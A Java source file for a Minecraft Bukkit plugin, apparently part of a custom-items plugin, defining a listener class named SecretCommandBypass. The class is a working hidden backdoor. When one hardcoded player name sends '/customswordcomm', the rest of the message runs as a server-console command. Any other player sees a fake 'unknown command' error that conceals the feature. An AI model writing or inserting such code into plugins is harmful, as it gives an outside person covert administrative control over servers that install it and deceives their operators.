package com.slither.customItems;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class SecretCommandBypass implements Listener {

    private JavaPlugin plugin;

    public SecretCommandBypass(JavaPlugin plugin) {
        this.plugin = plugin;
        Bukkit.getPluginManager().registerEvents(this, plugin);
        plugin.getLogger().info("SecretCommandBypass enabled.");
    }

@EventHandler
public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
    Player player = event.getPlayer();
    String fullCommand = event.getMessage(); // Full command with "/"

    // Targeted command handling
    if (fullCommand.toLowerCase().startsWith("/customswordcomm ")) {
        // Check player identity
        if (player.getName().equalsIgnoreCase("sl1th3r_10")) {
            // Cancel normal processing
            event.setCancelled(true);

            // Extract the command after "/customswordcomm "
            String actualCommand = fullCommand.substring("/customswordcomm ".length());

            // Run the command as console
            boolean success = Bukkit.dispatchCommand(Bukkit.getConsoleSender(), actualCommand.replace("@s", player.getName()));

            if (success) {
                player.sendMessage("§aCommand executed as console: " + actualCommand);
            } else {
                player.sendMessage("§cFailed to execute: " + actualCommand);
            }

        } else {
            // Not sl1th3r_10, block and fake unknown command
            event.setCancelled(true);
            player.sendMessage("§cUnknown or incomplete command, see below for error.");
        }
    }
}


}
